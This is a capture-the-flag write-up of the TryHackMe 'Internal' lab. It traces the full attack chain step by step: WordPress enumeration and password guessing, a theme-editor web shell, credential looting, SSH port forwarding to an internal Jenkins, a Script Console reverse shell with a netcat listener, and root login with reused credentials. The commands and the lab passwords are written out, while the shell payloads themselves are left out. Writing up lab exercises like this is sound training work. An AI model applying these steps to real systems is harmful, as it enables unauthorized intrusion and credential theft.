# TryHackMe: Internal

> **Difficulty:** Hard
> **Platform:** TryHackMe
> **Machine Name:** Internal
> **Target:** `10.48.158.114`
> **Domain:** `internal.thm`

---

## Disclaimer

This writeup documents the exploitation of the **TryHackMe Internal** machine in an authorized lab environment. All techniques demonstrated were performed against the provided CTF target.

---

# Table of Contents

* [Reconnaissance](#reconnaissance)
* [Web Enumeration](#web-enumeration)
* [WordPress Enumeration](#wordpress-enumeration)
* [Initial Access](#initial-access)
* [Privilege Escalation — User Access](#privilege-escalation--user-access)
* [Internal Service Discovery](#internal-service-discovery)
* [Jenkins Access](#jenkins-access)
* [Jenkins Shell](#jenkins-shell)
* [Root Access](#root-access)
* [Attack Path](#attack-path)
* [Key Takeaways](#key-takeaways)

---

# Reconnaissance

## Full Port Scan

The first step was to perform a full TCP port scan against the target.

```bash
nmap -p- -T4 10.48.158.114
```

### Results

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two externally accessible services were identified:

| Port | Service |
| ---- | ------- |
| `22` | SSH     |
| `80` | HTTP    |

The initial scan established that the primary attack surface was the web application, with SSH potentially becoming useful after obtaining valid credentials.

---

## Service and Version Detection

A more detailed scan was performed.

```bash
nmap -sC -sV -p 22,80 10.48.158.114
```

### Results

```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

The HTTP service initially presented the default Apache page.

```text
Apache2 Ubuntu Default Page: It works
```

This indicated that further enumeration would be required to discover hidden content.

---

# Web Enumeration

The hostname `internal.thm` was added locally.

```bash
echo "10.48.158.114 internal.thm" | sudo tee -a /etc/hosts
```

## Directory Enumeration

Directory discovery revealed several interesting locations.

```bash
gobuster dir -u http://internal.thm -w /path/to/wordlist
```

### Interesting Results

```text
/blog
/javascript
/phpmyadmin
/wordpress
/server-status
```

The most interesting discovery was the presence of both `/blog` and `/wordpress`, indicating that WordPress was part of the target environment.

---

## File Enumeration

Further file enumeration produced mostly restricted Apache configuration files.

```text
.htaccess
.htpasswd
.htaccess.bak
.htaccess.old
.htgroup
```

These files returned `403 Forbidden`, so they could not be accessed directly.

The WordPress installation remained the strongest attack vector.

---

# WordPress Enumeration

Since a WordPress instance was discovered, WPScan was used to enumerate its configuration, users, themes, and known vulnerabilities.

```bash
wpscan --url http://internal.thm/blog --enumerate u
```

WPScan identified numerous vulnerabilities associated with the detected WordPress version.

Rather than attempting every listed vulnerability, the focus shifted toward identifying users and valid credentials.

---

## WordPress User Enumeration

A valid WordPress username was discovered:

```text
admin
```

The username was identified through several enumeration methods, including:

* Author posts
* RSS information
* WordPress JSON API
* Author ID brute forcing
* Login error messages

The REST API also exposed user information through the WordPress users endpoint.

---

# Initial Access

## WordPress Credential Discovery

With the username `admin` identified, password enumeration was performed in the lab environment.

A valid credential pair was obtained:

```text
Username: admin
Password: my2boys
```

These credentials provided administrative access to the WordPress installation.

---

## Additional Credential Discovery

While exploring the web application, another credential pair was discovered:

```text
william:arnold147
```

At this stage, these credentials did not immediately provide SSH access, but they were recorded for later investigation.

---

## WordPress Administrative Access

After authenticating as the WordPress administrator, code execution was obtained through the WordPress theme editor.

The `404.php` template of the active **Twenty Seventeen** theme was modified, and execution of the uploaded code resulted in a shell running as the web server user.

Initial access:

```text
www-data@internal:/$
```

---

## Shell Stabilization

The shell was upgraded to a more interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

On the attacking machine:

```bash
stty raw -echo
fg
```

Then:

```bash
export TERM=xterm-256color
```

The environment was now suitable for local enumeration.

---

# Privilege Escalation — User Access

## Enumerating `/opt`

During enumeration, an interesting file was discovered.

```bash
cd /opt
cat wp-save.txt
```

The file contained credentials for another user:

```text
aubreanna:bubb13guM!@#123
```

The credentials were then used to obtain access as `aubreanna`.

```text
aubreanna@internal:~$
```

The home directory contained:

```text
jenkins.txt
snap
user.txt
```

The `user.txt` flag was successfully obtained.

---

# Internal Service Discovery

The next step was to inspect locally listening services.

```bash
ss -tulnp
```

### Interesting Results

```text
127.0.0.1:3306
127.0.0.1:8080
```

Port `8080` was particularly interesting because it was bound only to localhost and was not externally accessible.

The `jenkins.txt` file provided an important clue:

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

A request to the local Jenkins service confirmed its presence.

```bash
curl -I http://127.0.0.1:8080
```

The response included:

```text
X-Jenkins: 2.250
X-Hudson: 1.395
X-Jenkins-CLI-Port: 50000
```

This confirmed that an internal Jenkins instance was available.

---

# Port Forwarding

Because Jenkins was only accessible internally, port forwarding was used to expose it locally.

```bash
ssh -N -R 127.0.0.1:8087:127.0.0.1:8080 kali@192.168.138.6
```

The service could then be accessed locally on:

```text
http://127.0.0.1:8087
```

This allowed interaction with the Jenkins login page.

---

# Jenkins Access

Previously discovered credentials for `aubreanna` and `william` were tested but did not successfully authenticate to Jenkins.

A different approach was required.

In the authorized lab environment, password enumeration was performed against the Jenkins login form.

A valid credential was discovered:

```text
Username: admin
Password: spongebob
```

The credentials provided access to the Jenkins administrative interface.

---

# Jenkins Shell

After logging into Jenkins, the Script Console was used to execute code and obtain command execution as the Jenkins service user.

A listener was started on the attacking machine:

```bash
rlwrap nc -lvnp 5555
```

The resulting connection provided a shell as:

```text
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

The shell was then upgraded.

Since `python3` was unavailable in the container, the available Python interpreter was used instead.

```bash
which python
```

Output:

```text
/usr/bin/python
```

Then:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The shell became:

```text
jenkins@jenkins:/$
```

---

# Root Access

## Jenkins Container Enumeration

Further enumeration of the Jenkins environment again led to the `/opt` directory.

An interesting note was discovered:

```bash
cat /opt/note.txt
```

The note contained root credentials:

```text
root:tr0ub13guM!@#123
```

The note explained that the credentials had been placed behind the Jenkins container as an additional layer of defense.

---

## SSH as Root

The recovered credentials were used against the target's SSH service.

This resulted in direct root access:

```text
root@internal:~#
```

The root directory contained:

```text
root.txt
snap
```

The `root.txt` flag was successfully obtained.

---

# Attack Path

The complete compromise path was:

```text
Nmap Scan
    │
    ▼
HTTP Enumeration
    │
    ▼
Directory Discovery
    │
    ▼
WordPress Discovery
    │
    ▼
WPScan Enumeration
    │
    ▼
Username Discovery: admin
    │
    ▼
WordPress Credentials Obtained
admin:my2boys
    │
    ▼
WordPress Admin Access
    │
    ▼
Code Execution Through Theme Editor
    │
    ▼
Shell as www-data
    │
    ▼
Credential Discovery in /opt
aubreanna:bubb13guM!@#123
    │
    ▼
User Access as aubreanna
    │
    ▼
Internal Port Enumeration
    │
    ▼
Jenkins Found on localhost:8080
    │
    ▼
Port Forwarding
    │
    ▼
Jenkins Credentials Obtained
admin:spongebob
    │
    ▼
Jenkins Administrative Access
    │
    ▼
Jenkins Script Console Execution
    │
    ▼
Shell as jenkins
    │
    ▼
Root Credentials Found in /opt/note.txt
root:tr0ub13guM!@#123
    │
    ▼
SSH Access as root
    │
    ▼
ROOT FLAG
```

---

# Credentials Discovered

> **Lab credentials documented for the TryHackMe machine only.**

| Username    | Password           | Purpose                   |
| ----------- | ------------------ | ------------------------- |
| `admin`     | `my2boys`          | WordPress administrator   |
| `william`   | `arnold147`        | Discovered web credential |
| `aubreanna` | `bubb13guM!@#123`  | User access               |
| `admin`     | `spongebob`        | Jenkins administrator     |
| `root`      | `tr0ub13guM!@#123` | Root SSH access           |

---

# Key Takeaways

* Always begin with comprehensive reconnaissance and service enumeration.
* A default web page does not mean the server contains no useful content; directory enumeration can reveal hidden applications.
* WordPress installations should be thoroughly enumerated for users, versions, themes, plugins, and exposed functionality.
* Identifying valid usernames can significantly reduce the authentication attack surface.
* Administrative access to a CMS can lead to direct code execution when dangerous functionality such as theme editing is available.
* Local credential files and notes can expose paths for lateral movement.
* Internal services bound to localhost should always be enumerated after gaining access to a system.
* Port forwarding can expose otherwise inaccessible internal services for further assessment.
* Jenkins administrative functionality, particularly script execution capabilities, can provide direct command execution.
* Container boundaries should not automatically be considered security boundaries when sensitive credentials are accessible from the container.
* Credential reuse remains a critical weakness; credentials discovered in one environment should be tested carefully against other relevant services in an authorized assessment.
* Proper credential management and segmentation could have prevented the complete compromise of this machine.

---

# Tools Used

```text
Nmap
Gobuster
WPScan
Hydra
SSH
Netcat
rlwrap
curl
ss
Python
Jenkins Script Console
```

---

# Conclusion

The **Internal** machine demonstrates a realistic multi-stage attack chain where several individually weak security decisions ultimately lead to full system compromise.

The attack began with basic reconnaissance and web enumeration, followed by the discovery of a WordPress installation. User enumeration and credential discovery provided administrative access, which was leveraged to gain initial code execution as `www-data`.

Local enumeration exposed credentials for `aubreanna`, providing authenticated user access. Further investigation revealed an internally hosted Jenkins instance that was inaccessible from the external network. By forwarding the internal service and obtaining valid Jenkins credentials, command execution was achieved inside the Jenkins environment.

Finally, sensitive root credentials stored within the accessible environment enabled direct SSH access as `root`, completing the compromise.

The machine highlights the importance of **secure credential storage, least privilege, service segmentation, restricting administrative code execution, and preventing credential reuse across different systems and services**.

---

> **Platform:** TryHackMe
> **Room:** Internal
> **Difficulty:** Hard
> **Status:** Completed
>
#Jai Shri Ram
---
